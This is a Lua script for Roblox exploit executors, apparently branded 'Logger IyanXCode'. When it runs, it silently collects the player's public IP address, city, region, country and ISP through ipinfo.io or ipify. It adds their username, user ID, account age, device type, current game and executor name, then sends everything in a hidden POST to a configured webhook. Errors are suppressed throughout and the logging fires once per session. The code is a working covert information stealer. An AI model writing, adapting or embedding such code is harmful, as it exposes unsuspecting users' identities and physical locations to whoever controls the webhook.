local function sendWebhookNotification()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local MarketplaceService = game:GetService("MarketplaceService")
    local LocalPlayer = Players.LocalPlayer
    
    local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    
    if not httpRequest then 
        warn("No HTTP request function found")
        return 
    end
    
    if getgenv() and getgenv().WebhookSent then 
        return 
    end
    getgenv().WebhookSent = true

    -- Executor Detection
    local executorName = "Unknown"
    if identifyexecutor then
        executorName = identifyexecutor()
    elseif getexecutorname then
        executorName = getexecutorname()
    elseif executor then
        executorName = executor
    end

    -- Get IP and Location
    local ipAddress = "Unknown"
    local country = "Unknown"
    local region = "Unknown"
    local city = "Unknown"
    local isp = "Unknown"
    
    local success, result = pcall(function()
        return httpRequest({
            Url = "https://ipinfo.io/json",
            Method = "GET"
        })
    end)
    
    if success and result and result.Body then
        local successDecode, decoded = pcall(function()
            return HttpService:JSONDecode(result.Body)
        end)
        if successDecode and decoded then
            ipAddress = decoded.ip or "Unknown"
            country = decoded.country or "Unknown"
            region = decoded.region or "Unknown"
            city = decoded.city or "Unknown"
            isp = decoded.org or "Unknown"
        end
    end
    
    if ipAddress == "Unknown" then
        pcall(function()
            local altSuccess, altResult = pcall(function()
                return httpRequest({
                    Url = "https://api.ipify.org?format=json",
                    Method = "GET"
                })
            end)
            if altSuccess and altResult and altResult.Body then
                local decodeSuccess, altDecoded = pcall(function()
                    return HttpService:JSONDecode(altResult.Body)
                end)
                if decodeSuccess and altDecoded and altDecoded.ip then
                    ipAddress = altDecoded.ip
                end
            end
        end)
    end

    -- Get Game Info
    local gameName = "Unknown Game"
    pcall(function()
        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    -- Account Info
    local accountAgeDays = LocalPlayer.AccountAge
    local currentTime = os.time()
    local accountCreationTime = currentTime - (accountAgeDays * 86400)
    local accountCreatedDate = os.date("%Y-%m-%d", accountCreationTime)

    -- Device Type
    local deviceType = "Unknown"
    pcall(function()
        if game:GetService("GuiService"):IsTenFootInterface() then
            deviceType = "Console"
        elseif game:GetService("UserInputService").TouchEnabled then
            deviceType = "Mobile"
        else
            deviceType = "PC"
        end
    end)

    -- Profile Image
    local profileImageUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", LocalPlayer.UserId)

    -- Location Text
    local locationText = "Unknown"
    if city ~= "Unknown" and region ~= "Unknown" and country ~= "Unknown" then
        locationText = string.format("%s, %s, %s", city, region, country)
    elseif country ~= "Unknown" then
        locationText = country
    end

    -- Fields
    local fields = {
        {
            ["name"] = "👤 USER INFORMATION",
            ["value"] = "```" .. string.format(
                "Username: %s\n" ..
                "Display Name: %s\n" ..
                "User ID: %s\n" ..
                "Account Age: %d Days\n" ..
                "Account Created: %s\n" ..
                "Device Type: %s",
                LocalPlayer.Name,
                LocalPlayer.DisplayName,
                tostring(LocalPlayer.UserId),
                accountAgeDays,
                accountCreatedDate,
                deviceType
            ) .. "```",
            ["inline"] = false
        },
        {
            ["name"] = "🌐 NETWORK INFORMATION",
            ["value"] = "```" .. string.format(
                "IP Address: || %s ||\n" ..
                "Location: %s\n" ..
                "ISP: %s",
                ipAddress,
                locationText,
                isp
            ) .. "```",
            ["inline"] = false
        },
        {
            ["name"] = "🎮 GAME INFORMATION",
            ["value"] = "```" .. string.format(
                "Game Name: %s\n" ..
                "Place ID: %s\n" ..
                "Job ID: %s",
                gameName,
                tostring(game.PlaceId),
                game.JobId or "Unknown"
            ) .. "```",
            ["inline"] = false
        },
        {
            ["name"] = "🔗 QUICK LINKS",
            ["value"] = string.format(
                "Link Profile: [Click to Cek Profile](https://www.roblox.com/users/%s/profile)\n" ..
                "Link Game: [Click to Join Game](https://www.roblox.com/games/%s)",
                tostring(LocalPlayer.UserId),
                tostring(game.PlaceId)
            ),
            ["inline"] = false
        }
    }
    
    if executorName ~= "Unknown" then
        table.insert(fields, {
            ["name"] = "🛠️ EXECUTOR INFO",
            ["value"] = "```Executor: " .. executorName .. "```",
            ["inline"] = false
        })
    end

    -- Payload
    local payload = {
        ["username"] = "Logger IyanXCode",
        ["avatar_url"] = "https://cdn.phototourl.com/free/2026-06-19-444d2e83-1605-459c-be24-f2eccda6ca19.jpg",
        ["embeds"] = {{
            ["title"] = "📡 SCRIPT EXECUTION BY " .. (LocalPlayer.DisplayName or LocalPlayer.Name),
            ["color"] = WebhookConfig.EmbedColor,
            ["thumbnail"] = { 
                ["url"] = profileImageUrl
            },
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Script: " .. WebhookConfig.ScriptName
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    -- Send Webhook
    pcall(function()
        httpRequest({
            Url = WebhookConfig.Url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

